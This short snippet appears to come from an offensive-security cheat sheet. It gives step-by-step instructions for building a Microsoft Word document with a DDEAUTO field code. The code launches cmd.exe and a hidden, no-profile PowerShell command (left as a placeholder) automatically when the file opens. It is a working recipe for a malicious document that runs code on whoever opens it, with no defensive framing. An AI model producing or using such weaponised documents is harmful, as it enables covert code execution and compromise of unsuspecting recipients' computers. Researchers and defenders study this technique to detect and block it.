### create Dynamic Data Exchange inside Word document
```
Insert > Quick Parts (Icon with arrow down) > Field
= (Formula) > OK
Right click on "!Unexpected End of Formula" > Toggle Field Codes
Replace { = \* MERGEFORMAT } > { DDEAUTO "c:\\windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden <command>" "title"}
```

